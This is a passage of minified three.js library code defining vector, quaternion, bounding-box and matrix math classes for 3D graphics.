b=l*c.w+k*c.x+j*c.y+h*c.z;if(b<0){this.w=-c.w;this.x=-c.x;this.y=-c.y;this.z=-c.z;b=-b}else{this.copy(c)}if(b>=1){this.w=l;this.x=k;this.y=j;this.z=h;return this}var e=Math.acos(b);var a=Math.sqrt(1-b*b);if(Math.abs(a)<0.001){this.w=0.5*(l+this.w);this.x=0.5*(k+this.x);this.y=0.5*(j+this.y);this.z=0.5*(h+this.z);return this}var g=Math.sin((1-m)*e)/a,f=Math.sin(m*e)/a;this.w=(l*g+this.w*f);this.x=(k*g+this.x*f);this.y=(j*g+this.y*f);this.z=(h*g+this.z*f);return this},equals:function(a){return((a.x===this.x)&&(a.y===this.y)&&(a.z===this.z)&&(a.w===this.w))},fromArray:function(a){this.x=a[0];this.y=a[1];this.z=a[2];this.w=a[3];return this},toArray:function(){return[this.x,this.y,this.z,this.w]},clone:function(){return new THREE.Quaternion(this.x,this.y,this.z,this.w)}};THREE.Quaternion.slerp=function(e,c,b,a){return b.copy(e).slerp(c,a)};THREE.Vector2=function(a,b){this.x=a||0;this.y=b||0};THREE.Vector2.prototype={constructor:THREE.Vector2,set:function(a,b){this.x=a;this.y=b;return this},setX:function(a){this.x=a;return this},setY:function(a){this.y=a;return this},setComponent:function(a,b){switch(a){case 0:this.x=b;break;case 1:this.y=b;break;default:throw new Error("index is out of range: "+a)}},getComponent:function(a){switch(a){case 0:return this.x;case 1:return this.y;default:throw new Error("index is out of range: "+a)}},copy:function(a){this.x=a.x;this.y=a.y;return this},add:function(b,a){if(a!==undefined){console.warn("DEPRECATED: Vector2's .add() now only accepts one argument. Use .addVectors( a, b ) instead.");return this.addVectors(b,a)}this.x+=b.x;this.y+=b.y;return this},addVectors:function(e,c){this.x=e.x+c.x;this.y=e.y+c.y;return this},addScalar:function(a){this.x+=a;this.y+=a;return this},sub:function(b,a){if(a!==undefined){console.warn("DEPRECATED: Vector2's .sub() now only accepts one argument. Use .subVectors( a, b ) instead.");return this.subVectors(b,a)}this.x-=b.x;this.y-=b.y;return this},subVectors:function(e,c){this.x=e.x-c.x;this.y=e.y-c.y;return this},multiplyScalar:function(a){this.x*=a;this.y*=a;return this},divideScalar:function(a){if(a!==0){this.x/=a;this.y/=a}else{this.set(0,0)}return this},min:function(a){if(this.x>a.x){this.x=a.x}if(this.y>a.y){this.y=a.y}return this},max:function(a){if(this.x<a.x){this.x=a.x}if(this.y<a.y){this.y=a.y}return this},clamp:function(b,a){if(this.x<b.x){this.x=b.x}else{if(this.x>a.x){this.x=a.x}}if(this.y<b.y){this.y=b.y}else{if(this.y>a.y){this.y=a.y}}return this},negate:function(){return this.multiplyScalar(-1)},dot:function(a){return this.x*a.x+this.y*a.y},lengthSq:function(){return this.x*this.x+this.y*this.y},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y)},normalize:function(){return this.divideScalar(this.length())},distanceTo:function(a){return Math.sqrt(this.distanceToSquared(a))},distanceToSquared:function(c){var b=this.x-c.x,a=this.y-c.y;return b*b+a*a},setLength:function(a){var b=this.length();if(b!==0&&a!==b){this.multiplyScalar(a/b)}return this},lerp:function(a,b){this.x+=(a.x-this.x)*b;this.y+=(a.y-this.y)*b;return this},equals:function(a){return((a.x===this.x)&&(a.y===this.y))},fromArray:function(a){this.x=a[0];this.y=a[1];return this},toArray:function(){return[this.x,this.y]},clone:function(){return new THREE.Vector2(this.x,this.y)}};THREE.Vector3=function(a,c,b){this.x=a||0;this.y=c||0;this.z=b||0};THREE.Vector3.prototype={constructor:THREE.Vector3,set:function(a,c,b){this.x=a;this.y=c;this.z=b;return this},setX:function(a){this.x=a;return this},setY:function(a){this.y=a;return this},setZ:function(a){this.z=a;return this},setComponent:function(a,b){switch(a){case 0:this.x=b;break;case 1:this.y=b;break;case 2:this.z=b;break;default:throw new Error("index is out of range: "+a)}},getComponent:function(a){switch(a){case 0:return this.x;case 1:return this.y;case 2:return this.z;default:throw new Error("index is out of range: "+a)}},copy:function(a){this.x=a.x;this.y=a.y;this.z=a.z;return this},add:function(b,a){if(a!==undefined){console.warn("DEPRECATED: Vector3's .add() now only accepts one argument. Use .addVectors( a, b ) instead.");return this.addVectors(b,a)}this.x+=b.x;this.y+=b.y;this.z+=b.z;return this},addScalar:function(a){this.x+=a;this.y+=a;this.z+=a;return this},addVectors:function(e,c){this.x=e.x+c.x;this.y=e.y+c.y;this.z=e.z+c.z;return this},sub:function(b,a){if(a!==undefined){console.warn("DEPRECATED: Vector3's .sub() now only accepts one argument. Use .subVectors( a, b ) instead.");return this.subVectors(b,a)}this.x-=b.x;this.y-=b.y;this.z-=b.z;return this},subVectors:function(e,c){this.x=e.x-c.x;this.y=e.y-c.y;this.z=e.z-c.z;return this},multiply:function(b,a){if(a!==undefined){console.warn("DEPRECATED: Vector3's .multiply() now only accepts one argument. Use .multiplyVectors( a, b ) instead.");return this.multiplyVectors(b,a)}this.x*=b.x;this.y*=b.y;this.z*=b.z;return this},multiplyScalar:function(a){this.x*=a;this.y*=a;this.z*=a;return this},multiplyVectors:function(e,c){this.x=e.x*c.x;this.y=e.y*c.y;this.z=e.z*c.z;return this},applyMatrix3:function(b){var a=this.x;var g=this.y;var f=this.z;var c=b.elements;this.x=c[0]*a+c[3]*g+c[6]*f;this.y=c[1]*a+c[4]*g+c[7]*f;this.z=c[2]*a+c[5]*g+c[8]*f;return this},applyMatrix4:function(b){var a=this.x,g=this.y,f=this.z;var c=b.elements;this.x=c[0]*a+c[4]*g+c[8]*f+c[12];this.y=c[1]*a+c[5]*g+c[9]*f+c[13];this.z=c[2]*a+c[6]*g+c[10]*f+c[14];return this},applyProjection:function(b){var a=this.x,h=this.y,g=this.z;var c=b.elements;var f=1/(c[3]*a+c[7]*h+c[11]*g+c[15]);this.x=(c[0]*a+c[4]*h+c[8]*g+c[12])*f;this.y=(c[1]*a+c[5]*h+c[9]*g+c[13])*f;this.z=(c[2]*a+c[6]*h+c[10]*g+c[14])*f;return this},applyQuaternion:function(a){var o=this.x;var m=this.y;var l=this.z;var j=a.x;var h=a.y;var g=a.z;var k=a.w;var e=k*o+h*l-g*m;var c=k*m+g*o-j*l;var b=k*l+j*m-h*o;var f=-j*o-h*m-g*l;this.x=e*k+f*-j+c*-g-b*-h;this.y=c*k+f*-h+b*-j-e*-g;this.z=b*k+f*-g+e*-h-c*-j;return this},transformDirection:function(b){var a=this.x,g=this.y,f=this.z;var c=b.elements;this.x=c[0]*a+c[4]*g+c[8]*f;this.y=c[1]*a+c[5]*g+c[9]*f;this.z=c[2]*a+c[6]*g+c[10]*f;this.normalize();return this},divide:function(a){this.x/=a.x;this.y/=a.y;this.z/=a.z;return this},divideScalar:function(a){if(a!==0){this.x/=a;this.y/=a;this.z/=a}else{this.x=0;this.y=0;this.z=0}return this},min:function(a){if(this.x>a.x){this.x=a.x}if(this.y>a.y){this.y=a.y}if(this.z>a.z){this.z=a.z}return this},max:function(a){if(this.x<a.x){this.x=a.x}if(this.y<a.y){this.y=a.y}if(this.z<a.z){this.z=a.z}return this},clamp:function(b,a){if(this.x<b.x){this.x=b.x}else{if(this.x>a.x){this.x=a.x}}if(this.y<b.y){this.y=b.y}else{if(this.y>a.y){this.y=a.y}}if(this.z<b.z){this.z=b.z}else{if(this.z>a.z){this.z=a.z}}return this},negate:function(){return this.multiplyScalar(-1)},dot:function(a){return this.x*a.x+this.y*a.y+this.z*a.z},lengthSq:function(){return this.x*this.x+this.y*this.y+this.z*this.z},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z)},lengthManhattan:function(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)},normalize:function(){return this.divideScalar(this.length())},setLength:function(a){var b=this.length();if(b!==0&&a!==b){this.multiplyScalar(a/b)}return this},lerp:function(a,b){this.x+=(a.x-this.x)*b;this.y+=(a.y-this.y)*b;this.z+=(a.z-this.z)*b;return this},cross:function(c,b){if(b!==undefined){console.warn("DEPRECATED: Vector3's .cross() now only accepts one argument. Use .crossVectors( a, b ) instead.");return this.crossVectors(c,b)}var a=this.x,f=this.y,e=this.z;this.x=f*c.z-e*c.y;this.y=e*c.x-a*c.z;this.z=a*c.y-f*c.x;return this},crossVectors:function(e,c){this.x=e.y*c.z-e.z*c.y;this.y=e.z*c.x-e.x*c.z;this.z=e.x*c.y-e.y*c.x;return this},angleTo:function(a){var b=this.dot(a)/(this.length()*a.length());return Math.acos(THREE.Math.clamp(b,-1,1))},distanceTo:function(a){return Math.sqrt(this.distanceToSquared(a))},distanceToSquared:function(e){var c=this.x-e.x;var b=this.y-e.y;var a=this.z-e.z;return c*c+b*b+a*a},setEulerFromRotationMatrix:function(f,g){function k(m){return Math.min(Math.max(m,-1),1)}var e=f.elements;var l=e[0],j=e[4],h=e[8];var c=e[1],b=e[5],a=e[9];var q=e[2],p=e[6],o=e[10];if(g===undefined||g==="XYZ"){this.y=Math.asin(k(h));if(Math.abs(h)<0.99999){this.x=Math.atan2(-a,o);this.z=Math.atan2(-j,l)}else{this.x=Math.atan2(p,b);this.z=0}}else{if(g==="YXZ"){this.x=Math.asin(-k(a));if(Math.abs(a)<0.99999){this.y=Math.atan2(h,o);this.z=Math.atan2(c,b)}else{this.y=Math.atan2(-q,l);this.z=0}}else{if(g==="ZXY"){this.x=Math.asin(k(p));if(Math.abs(p)<0.99999){this.y=Math.atan2(-q,o);this.z=Math.atan2(-j,b)}else{this.y=0;this.z=Math.atan2(c,l)}}else{if(g==="ZYX"){this.y=Math.asin(-k(q));if(Math.abs(q)<0.99999){this.x=Math.atan2(p,o);this.z=Math.atan2(c,l)}else{this.x=0;this.z=Math.atan2(-j,b)}}else{if(g==="YZX"){this.z=Math.asin(k(c));if(Math.abs(c)<0.99999){this.x=Math.atan2(-a,b);this.y=Math.atan2(-q,l)}else{this.x=0;this.y=Math.atan2(h,o)}}else{if(g==="XZY"){this.z=Math.asin(-k(j));if(Math.abs(j)<0.99999){this.x=Math.atan2(p,b);this.y=Math.atan2(h,l)}else{this.x=Math.atan2(-a,o);this.y=0}}}}}}}return this},setEulerFromQuaternion:function(e,a){function h(j){return Math.min(Math.max(j,-1),1)}var f=e.x*e.x;var c=e.y*e.y;var b=e.z*e.z;var g=e.w*e.w;if(a===undefined||a==="XYZ"){this.x=Math.atan2(2*(e.x*e.w-e.y*e.z),(g-f-c+b));this.y=Math.asin(h(2*(e.x*e.z+e.y*e.w)));this.z=Math.atan2(2*(e.z*e.w-e.x*e.y),(g+f-c-b))}else{if(a==="YXZ"){this.x=Math.asin(h(2*(e.x*e.w-e.y*e.z)));this.y=Math.atan2(2*(e.x*e.z+e.y*e.w),(g-f-c+b));this.z=Math.atan2(2*(e.x*e.y+e.z*e.w),(g-f+c-b))}else{if(a==="ZXY"){this.x=Math.asin(h(2*(e.x*e.w+e.y*e.z)));this.y=Math.atan2(2*(e.y*e.w-e.z*e.x),(g-f-c+b));this.z=Math.atan2(2*(e.z*e.w-e.x*e.y),(g-f+c-b))}else{if(a==="ZYX"){this.x=Math.atan2(2*(e.x*e.w+e.z*e.y),(g-f-c+b));this.y=Math.asin(h(2*(e.y*e.w-e.x*e.z)));this.z=Math.atan2(2*(e.x*e.y+e.z*e.w),(g+f-c-b))}else{if(a==="YZX"){this.x=Math.atan2(2*(e.x*e.w-e.z*e.y),(g-f+c-b));this.y=Math.atan2(2*(e.y*e.w-e.x*e.z),(g+f-c-b));this.z=Math.asin(h(2*(e.x*e.y+e.z*e.w)))}else{if(a==="XZY"){this.x=Math.atan2(2*(e.x*e.w+e.y*e.z),(g-f+c-b));this.y=Math.atan2(2*(e.x*e.z+e.y*e.w),(g+f-c-b));this.z=Math.asin(h(2*(e.z*e.w-e.x*e.y)))}}}}}}return this},getPositionFromMatrix:function(a){this.x=a.elements[12];this.y=a.elements[13];this.z=a.elements[14];return this},getScaleFromMatrix:function(a){var e=this.set(a.elements[0],a.elements[1],a.elements[2]).length();var c=this.set(a.elements[4],a.elements[5],a.elements[6]).length();var b=this.set(a.elements[8],a.elements[9],a.elements[10]).length();this.x=e;this.y=c;this.z=b;return this},getColumnFromMatrix:function(b,a){var e=b*4;var c=a.elements;this.x=c[e];this.y=c[e+1];this.z=c[e+2];return this},equals:function(a){return((a.x===this.x)&&(a.y===this.y)&&(a.z===this.z))},fromArray:function(a){this.x=a[0];this.y=a[1];this.z=a[2];return this},toArray:function(){return[this.x,this.y,this.z]},clone:function(){return new THREE.Vector3(this.x,this.y,this.z)}};THREE.extend(THREE.Vector3.prototype,{applyEuler:function(){var a=new THREE.Quaternion();return function(b,e){var c=a.setFromEuler(b,e);this.applyQuaternion(c);return this}}(),applyAxisAngle:function(){var a=new THREE.Quaternion();return function(b,e){var c=a.setFromAxisAngle(b,e);this.applyQuaternion(c);return this}}(),projectOnVector:function(){var a=new THREE.Vector3();return function(b){a.copy(b).normalize();var c=this.dot(a);return this.copy(a).multiplyScalar(c)}}(),projectOnPlane:function(){var a=new THREE.Vector3();return function(b){a.copy(this).projectOnVector(b);return this.sub(a)}}(),reflect:function(){var a=new THREE.Vector3();return function(b){a.copy(this).projectOnVector(b).multiplyScalar(2);return this.subVectors(a,this)}}()});THREE.Vector4=function(a,e,c,b){this.x=a||0;this.y=e||0;this.z=c||0;this.w=(b!==undefined)?b:1};THREE.Vector4.prototype={constructor:THREE.Vector4,set:function(a,e,c,b){this.x=a;this.y=e;this.z=c;this.w=b;return this},setX:function(a){this.x=a;return this},setY:function(a){this.y=a;return this},setZ:function(a){this.z=a;return this},setW:function(a){this.w=a;return this},setComponent:function(a,b){switch(a){case 0:this.x=b;break;case 1:this.y=b;break;case 2:this.z=b;break;case 3:this.w=b;break;default:throw new Error("index is out of range: "+a)}},getComponent:function(a){switch(a){case 0:return this.x;case 1:return this.y;case 2:return this.z;case 3:return this.w;default:throw new Error("index is out of range: "+a)}},copy:function(a){this.x=a.x;this.y=a.y;this.z=a.z;this.w=(a.w!==undefined)?a.w:1;return this},add:function(b,a){if(a!==undefined){console.warn("DEPRECATED: Vector4's .add() now only accepts one argument. Use .addVectors( a, b ) instead.");return this.addVectors(b,a)}this.x+=b.x;this.y+=b.y;this.z+=b.z;this.w+=b.w;return this},addScalar:function(a){this.x+=a;this.y+=a;this.z+=a;this.w+=a;return this},addVectors:function(e,c){this.x=e.x+c.x;this.y=e.y+c.y;this.z=e.z+c.z;this.w=e.w+c.w;return this},sub:function(b,a){if(a!==undefined){console.warn("DEPRECATED: Vector4's .sub() now only accepts one argument. Use .subVectors( a, b ) instead.");return this.subVectors(b,a)}this.x-=b.x;this.y-=b.y;this.z-=b.z;this.w-=b.w;return this},subVectors:function(e,c){this.x=e.x-c.x;this.y=e.y-c.y;this.z=e.z-c.z;this.w=e.w-c.w;return this},multiplyScalar:function(a){this.x*=a;this.y*=a;this.z*=a;this.w*=a;return this},applyMatrix4:function(b){var a=this.x;var h=this.y;var g=this.z;var c=this.w;var f=b.elements;this.x=f[0]*a+f[4]*h+f[8]*g+f[12]*c;this.y=f[1]*a+f[5]*h+f[9]*g+f[13]*c;this.z=f[2]*a+f[6]*h+f[10]*g+f[14]*c;this.w=f[3]*a+f[7]*h+f[11]*g+f[15]*c;return this},divideScalar:function(a){if(a!==0){this.x/=a;this.y/=a;this.z/=a;this.w/=a}else{this.x=0;this.y=0;this.z=0;this.w=1}return this},setAxisAngleFromQuaternion:function(b){this.w=2*Math.acos(b.w);var a=Math.sqrt(1-b.w*b.w);if(a<0.0001){this.x=1;this.y=0;this.z=0}else{this.x=b.x/a;this.y=b.y/a;this.z=b.z/a}return this},setAxisAngleFromRotationMatrix:function(A){var B,l,k,j,G=0.01,o=0.1,h=A.elements,F=h[0],D=h[4],C=h[8],f=h[1],c=h[5],a=h[9],w=h[2],t=h[6],q=h[10];if((Math.abs(D-f)<G)&&(Math.abs(C-w)<G)&&(Math.abs(a-t)<G)){if((Math.abs(D+f)<o)&&(Math.abs(C+w)<o)&&(Math.abs(a+t)<o)&&(Math.abs(F+c+q-3)<o)){this.set(1,0,0,0);return this}B=Math.PI;var g=(F+1)/2;var u=(c+1)/2;var E=(q+1)/2;var e=(D+f)/4;var b=(C+w)/4;var r=(a+t)/4;if((g>u)&&(g>E)){if(g<G){l=0;k=0.707106781;j=0.707106781}else{l=Math.sqrt(g);k=e/l;j=b/l}}else{if(u>E){if(u<G){l=0.707106781;k=0;j=0.707106781}else{k=Math.sqrt(u);l=e/k;j=r/k}}else{if(E<G){l=0.707106781;k=0.707106781;j=0}else{j=Math.sqrt(E);l=b/j;k=r/j}}}this.set(l,k,j,B);return this}var p=Math.sqrt((t-a)*(t-a)+(C-w)*(C-w)+(f-D)*(f-D));if(Math.abs(p)<0.001){p=1}this.x=(t-a)/p;this.y=(C-w)/p;this.z=(f-D)/p;this.w=Math.acos((F+c+q-1)/2);return this},min:function(a){if(this.x>a.x){this.x=a.x}if(this.y>a.y){this.y=a.y}if(this.z>a.z){this.z=a.z}if(this.w>a.w){this.w=a.w}return this},max:function(a){if(this.x<a.x){this.x=a.x}if(this.y<a.y){this.y=a.y}if(this.z<a.z){this.z=a.z}if(this.w<a.w){this.w=a.w}return this},clamp:function(b,a){if(this.x<b.x){this.x=b.x}else{if(this.x>a.x){this.x=a.x}}if(this.y<b.y){this.y=b.y}else{if(this.y>a.y){this.y=a.y}}if(this.z<b.z){this.z=b.z}else{if(this.z>a.z){this.z=a.z}}if(this.w<b.w){this.w=b.w}else{if(this.w>a.w){this.w=a.w}}return this},negate:function(){return this.multiplyScalar(-1)},dot:function(a){return this.x*a.x+this.y*a.y+this.z*a.z+this.w*a.w},lengthSq:function(){return this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w)},lengthManhattan:function(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)+Math.abs(this.w)},normalize:function(){return this.divideScalar(this.length())},setLength:function(a){var b=this.length();if(b!==0&&a!==b){this.multiplyScalar(a/b)}return this},lerp:function(a,b){this.x+=(a.x-this.x)*b;this.y+=(a.y-this.y)*b;this.z+=(a.z-this.z)*b;this.w+=(a.w-this.w)*b;return this},equals:function(a){return((a.x===this.x)&&(a.y===this.y)&&(a.z===this.z)&&(a.w===this.w))},fromArray:function(a){this.x=a[0];this.y=a[1];this.z=a[2];this.w=a[3];return this},toArray:function(){return[this.x,this.y,this.z,this.w]},clone:function(){return new THREE.Vector4(this.x,this.y,this.z,this.w)}};THREE.Line3=function(b,a){this.start=(b!==undefined)?b:new THREE.Vector3();this.end=(a!==undefined)?a:new THREE.Vector3()};THREE.Line3.prototype={constructor:THREE.Line3,set:function(b,a){this.start.copy(b);this.end.copy(a);return this},copy:function(a){this.start.copy(a.start);this.end.copy(a.end);return this},center:function(b){var a=b||new THREE.Vector3();return a.addVectors(this.start,this.end).multiplyScalar(0.5)},delta:function(b){var a=b||new THREE.Vector3();return a.subVectors(this.end,this.start)},distanceSq:function(){return this.start.distanceToSquared(this.end)},distance:function(){return this.start.distanceTo(this.end)},at:function(c,b){var a=b||new THREE.Vector3();return this.delta(a).multiplyScalar(c).add(this.start)},closestPointToPointParameter:function(){var b=new THREE.Vector3();var a=new THREE.Vector3();return function(c,h){b.subVectors(c,this.start);a.subVectors(this.end,this.start);var g=a.dot(a);var f=a.dot(b);var e=f/g;if(h){e=THREE.Math.clamp(e,0,1)}return e}}(),closestPointToPoint:function(b,f,e){var c=this.closestPointToPointParameter(b,f);var a=e||new THREE.Vector3();return this.delta(a).multiplyScalar(c).add(this.start)},applyMatrix4:function(a){this.start.applyMatrix4(a);this.end.applyMatrix4(a);return this},equals:function(a){return a.start.equals(this.start)&&a.end.equals(this.end)},clone:function(){return new THREE.Line3().copy(this)}};THREE.Box2=function(b,a){this.min=(b!==undefined)?b:new THREE.Vector2(Infinity,Infinity);this.max=(a!==undefined)?a:new THREE.Vector2(-Infinity,-Infinity)};THREE.Box2.prototype={constructor:THREE.Box2,set:function(b,a){this.min.copy(b);this.max.copy(a);return this},setFromPoints:function(e){if(e.length>0){var a=e[0];this.min.copy(a);this.max.copy(a);for(var c=1,b=e.length;c<b;c++){a=e[c];if(a.x<this.min.x){this.min.x=a.x}else{if(a.x>this.max.x){this.max.x=a.x}}if(a.y<this.min.y){this.min.y=a.y}else{if(a.y>this.max.y){this.max.y=a.y}}}}else{this.makeEmpty()}return this},setFromCenterAndSize:function(){var a=new THREE.Vector2();return function(b,e){var c=a.copy(e).multiplyScalar(0.5);this.min.copy(b).sub(c);this.max.copy(b).add(c);return this}}(),copy:function(a){this.min.copy(a.min);this.max.copy(a.max);return this},makeEmpty:function(){this.min.x=this.min.y=Infinity;this.max.x=this.max.y=-Infinity;return this},empty:function(){return(this.max.x<this.min.x)||(this.max.y<this.min.y)},center:function(b){var a=b||new THREE.Vector2();return a.addVectors(this.min,this.max).multiplyScalar(0.5)},size:function(b){var a=b||new THREE.Vector2();return a.subVectors(this.max,this.min)},expandByPoint:function(a){this.min.min(a);this.max.max(a);return this},expandByVector:function(a){this.min.sub(a);this.max.add(a);return this},expandByScalar:function(a){this.min.addScalar(-a);this.max.addScalar(a);return this},containsPoint:function(a){if(a.x<this.min.x||a.x>this.max.x||a.y<this.min.y||a.y>this.max.y){return false}return true},containsBox:function(a){if((this.min.x<=a.min.x)&&(a.max.x<=this.max.x)&&(this.min.y<=a.min.y)&&(a.max.y<=this.max.y)){return true}return false},getParameter:function(a){return new THREE.Vector2((a.x-this.min.x)/(this.max.x-this.min.x),(a.y-this.min.y)/(this.max.y-this.min.y))},isIntersectionBox:function(a){if(a.max.x<this.min.x||a.min.x>this.max.x||a.max.y<this.min.y||a.min.y>this.max.y){return false}return true},clampPoint:function(b,c){var a=c||new THREE.Vector2();return a.copy(b).clamp(this.min,this.max)},distanceToPoint:function(){var a=new THREE.Vector2();return function(b){var c=a.copy(b).clamp(this.min,this.max);return c.sub(b).length()}}(),intersect:function(a){this.min.max(a.min);this.max.min(a.max);return this},union:function(a){this.min.min(a.min);this.max.max(a.max);return this},translate:function(a){this.min.add(a);this.max.add(a);return this},equals:function(a){return a.min.equals(this.min)&&a.max.equals(this.max)},clone:function(){return new THREE.Box2().copy(this)}};THREE.Box3=function(b,a){this.min=(b!==undefined)?b:new THREE.Vector3(Infinity,Infinity,Infinity);this.max=(a!==undefined)?a:new THREE.Vector3(-Infinity,-Infinity,-Infinity)};THREE.Box3.prototype={constructor:THREE.Box3,set:function(b,a){this.min.copy(b);this.max.copy(a);return this},setFromPoints:function(e){if(e.length>0){var a=e[0];this.min.copy(a);this.max.copy(a);for(var c=1,b=e.length;c<b;c++){a=e[c];if(a.x<this.min.x){this.min.x=a.x}else{if(a.x>this.max.x){this.max.x=a.x}}if(a.y<this.min.y){this.min.y=a.y}else{if(a.y>this.max.y){this.max.y=a.y}}if(a.z<this.min.z){this.min.z=a.z}else{if(a.z>this.max.z){this.max.z=a.z}}}}else{this.makeEmpty()}return this},setFromCenterAndSize:function(){var a=new THREE.Vector3();return function(b,e){var c=a.copy(e).multiplyScalar(0.5);this.min.copy(b).sub(c);this.max.copy(b).add(c);return this}}(),copy:function(a){this.min.copy(a.min);this.max.copy(a.max);return this},makeEmpty:function(){this.min.x=this.min.y=this.min.z=Infinity;this.max.x=this.max.y=this.max.z=-Infinity;return this},empty:function(){return(this.max.x<this.min.x)||(this.max.y<this.min.y)||(this.max.z<this.min.z)},center:function(b){var a=b||new THREE.Vector3();return a.addVectors(this.min,this.max).multiplyScalar(0.5)},size:function(b){var a=b||new THREE.Vector3();return a.subVectors(this.max,this.min)},expandByPoint:function(a){this.min.min(a);this.max.max(a);return this},expandByVector:function(a){this.min.sub(a);this.max.add(a);return this},expandByScalar:function(a){this.min.addScalar(-a);this.max.addScalar(a);return this},containsPoint:function(a){if(a.x<this.min.x||a.x>this.max.x||a.y<this.min.y||a.y>this.max.y||a.z<this.min.z||a.z>this.max.z){return false}return true},containsBox:function(a){if((this.min.x<=a.min.x)&&(a.max.x<=this.max.x)&&(this.min.y<=a.min.y)&&(a.max.y<=this.max.y)&&(this.min.z<=a.min.z)&&(a.max.z<=this.max.z)){return true}return false},getParameter:function(a){return new THREE.Vector3((a.x-this.min.x)/(this.max.x-this.min.x),(a.y-this.min.y)/(this.max.y-this.min.y),(a.z-this.min.z)/(this.max.z-this.min.z))},isIntersectionBox:function(a){if(a.max.x<this.min.x||a.min.x>this.max.x||a.max.y<this.min.y||a.min.y>this.max.y||a.max.z<this.min.z||a.min.z>this.max.z){return false}return true},clampPoint:function(b,c){var a=c||new THREE.Vector3();return a.copy(b).clamp(this.min,this.max)},distanceToPoint:function(){var a=new THREE.Vector3();return function(b){var c=a.copy(b).clamp(this.min,this.max);return c.sub(b).length()}}(),getBoundingSphere:function(){var a=new THREE.Vector3();return function(c){var b=c||new THREE.Sphere();b.center=this.center();b.radius=this.size(a).length()*0.5;return b}}(),intersect:function(a){this.min.max(a.min);this.max.min(a.max);return this},union:function(a){this.min.min(a.min);this.max.max(a.max);return this},applyMatrix4:function(){var a=[new THREE.Vector3(),new THREE.Vector3(),new THREE.Vector3(),new THREE.Vector3(),new THREE.Vector3(),new THREE.Vector3(),new THREE.Vector3(),new THREE.Vector3()];return function(b){a[0].set(this.min.x,this.min.y,this.min.z).applyMatrix4(b);a[1].set(this.min.x,this.min.y,this.max.z).applyMatrix4(b);a[2].set(this.min.x,this.max.y,this.min.z).applyMatrix4(b);a[3].set(this.min.x,this.max.y,this.max.z).applyMatrix4(b);a[4].set(this.max.x,this.min.y,this.min.z).applyMatrix4(b);a[5].set(this.max.x,this.min.y,this.max.z).applyMatrix4(b);a[6].set(this.max.x,this.max.y,this.min.z).applyMatrix4(b);a[7].set(this.max.x,this.max.y,this.max.z).applyMatrix4(b);this.makeEmpty();this.setFromPoints(a);return this}}(),translate:function(a){this.min.add(a);this.max.add(a);return this},equals:function(a){return a.min.equals(this.min)&&a.max.equals(this.max)},clone:function(){return new THREE.Box3().copy(this)}};THREE.Matrix3=function(h,g,f,e,c,b,a,k,j){this.elements=new Float32Array(9);this.set((h!==undefined)?h:1,g||0,f||0,e||0,(c!==undefined)?c:1,b||0,a||0,k||0,(j!==undefined)?j:1)};THREE.Matrix3.prototype={constructor:THREE.Matrix3,set:function(j,h,g,f,e,c,a,l,k){var b=this.elements;b[0]=j;b[3]=h;b[6]=g;b[1]=f;b[4]=e;b[7]=c;b[2]=a;b[5]=l;b[8]=k;return this},identity:function(){this.set(1,0,0,0,1,0,0,0,1);return this},copy:function(a){var b=a.elements;this.set(b[0],b[3],b[6],b[1],b[4],b[7],b[2],b[5],b[8]);return this},multiplyVector3:function(a){console.warn("DEPRECATED: Matrix3's .multiplyVector3() has been removed. Use vector.applyMatrix3( matrix ) instead.");return a.applyMatrix3(this)},multiplyVector3Array:function(){var a=new THREE.Vector3();return function(b){for(var e=0,c=b.length;e<c;e+=3){a.x=b[e];a.y=b[e+1];a.z=b[e+2];a.applyMatrix3(this);b[e]=a.x;b[e+1]=a.y;b[e+2]=a.z}return b}}(),multiplyScalar:function(a){var b=this.elements;b[0]*=a;b[3]*=a;b[6]*=a;b[1]*=a;b[4]*=a;b[7]*=a;b[2]*=a;b[5]*=a;b[8]*=a;return this},determinant:function(){var j=this.elements;var t=j[0],s=j[1],r=j[2],q=j[3],p=j[4],o=j[5],m=j[6],l=j[7],k=j[8];return t*p*k-t*o*l-s*q*k+s*o*m+r*q*l-r*p*m},getInverse:function(b,a){var e=b.elements;var g=this.elements;g[0]=e[10]*e[5]-e[6]*e[9];g[1]=-e[10]*e[1]+e[2]*e[9];g[2]=e[6]*e[1]-e[2]*e[5];g[3]=-e[10]*e[4]+e[6]*e[8];g[4]=e[10]*e[0]-e[2]*e[8];g[5]=-e[6]*e[0]+e[2]*e[4];g[6]=e[9]*e[4]-e[5]*e[8];g[7]=-e[9]*e[0]+e[1]*e[8];g[8]=e[5]*e[0]-e[1]*e[4];var c=e[0]*g[0]+e[1]*g[3]+e[2]*g[6];if(c===0){var f="Matrix3.getInverse(): can't invert matrix, determinant is 0";if(a||false){throw new Error(f)}else{console.warn(f)}this.identity();return this}this.multiplyScalar(1/c);return this},transpose:function(){var b,a=this.elements;b=a[1];a[1]=a[3];a[3]=b;b=a[2];a[2]=a[6];a[6]=b;b=a[5];a[5]=a[7];a[7]=b;return this},getNormalMatrix:function(a){this.getInverse(a).transpose();return this},transposeIntoArray:function(b){var a=this.elements;b[0]=a[0];b[1]=a[3];b[2]=a[6];b[3]=a[1];b[4]=a[4];b[5]=a[7];b[6]=a[2];b[7]=a[5];b[8]=a[8];return this},clone:function(){var a=this.elements;return new THREE.Matrix3(a[0],a[3],a[6],a[1],a[4],a[7],a[2],a[5],a[8])}};THREE.Matrix4=function(q,p,m,k,g,f,e,c,a,t,s,r,o,l,j,h){var b=this.elements=new Float32Array(16);b[0]=(q!==undefined)?q:1;b[4]=p||0;b[8]=m||0;b[12]=k||0;b[1]=g||0;b[5]=(f!==undefined)?f:1;b[9]=e||0;b[13]=c||0;b[2]=a||0;b[6]=t||0;b[10]=(s!==undefined)?s:1;b[14]=r||0;b[3]=o||0;b[7]=l||0;b[11]=j||0;b[15]=(h!==undefined)?h:1};THREE.Matrix4.prototype={constructor:THREE.Matrix4,set:function(q,p,m,k,g,f,e,c,a,t,s,r,o,l,j,h){var b=this.elements;b[0]=q;b[4]=p;b[8]=m;b[12]=k;b[1]=g;b[5]=f;b[9]=e;b[13]=c;b[2]=a;b[6]=t;b[10]=s;b[14]=r;b[3]=o;b[7]=l;b[11]=j;b[15]=h;return this},identity:function(){this.set(1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1);return this},copy:function(a){var 